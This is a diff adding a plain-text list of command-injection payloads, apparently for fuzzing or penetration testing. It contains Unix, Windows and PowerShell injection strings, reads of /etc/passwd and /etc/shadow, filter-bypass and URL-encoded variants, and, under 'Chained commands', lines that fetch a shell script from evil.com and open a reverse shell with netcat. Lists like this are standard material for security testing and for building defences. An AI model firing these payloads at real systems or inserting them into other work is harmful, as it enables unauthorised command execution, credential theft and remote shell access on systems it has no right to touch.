@@ -1,0 +1,90 @@
+# Command Injection Payloads
+# These attempt to execute system commands
+
+# Basic command separators (Unix/Linux)
+; ls -la
+| cat /etc/passwd
+|| whoami
+& ping -c 10 127.0.0.1
+&& id
+
+# Command substitution
+`whoami`
+$(whoami)
+`cat /etc/passwd`
+$(cat /etc/passwd)
+
+# Pipe to commands
+| ls
+| pwd
+| uname -a
+| id
+
+# Backgrounding
+; sleep 10 &
+& sleep 10 &
+
+# Chained commands
+; curl http://evil.com
+; wget http://evil.com/shell.sh
+; nc -e /bin/bash evil.com 4444
+
+# File operations
+; cat /etc/passwd
+; cat /etc/shadow
+; ls -la /root
+; find / -name "*.conf"
+
+# Network commands
+; ping -c 5 google.com
+; nslookup google.com
+; dig google.com
+; traceroute google.com
+
+# Windows commands
+& dir
+| dir
+& type C:\windows\win.ini
+&& systeminfo
+| net user
+
+# PowerShell injection
+; powershell -c whoami
+| powershell Get-Process
+& powershell -enc <base64>
+
+# Newline injection
+%0A whoami
+%0A cat /etc/passwd
+\n whoami
+\n ls -la
+
+# With quotes
+'; whoami; '
+"; whoami; "
+`; id; `
+
+# URL encoded
+%3B%20ls%20-la
+%7C%20cat%20%2Fetc%2Fpasswd
+%26%26%20whoami
+
+# Time-based detection
+; sleep 5
+| sleep 5
+& ping -c 5 127.0.0.1
+&& timeout 5
+
+# Filter bypass
+;w'h'o'a'm'i
+;who$()ami
+;w\h\o\a\m\i
+
+# Inline execution
+test`whoami`
+test$(whoami)
+test|whoami
+
+# Multiple encodings
+%3B%20%77%68%6F%61%6D%69
+\x3b\x20whoami
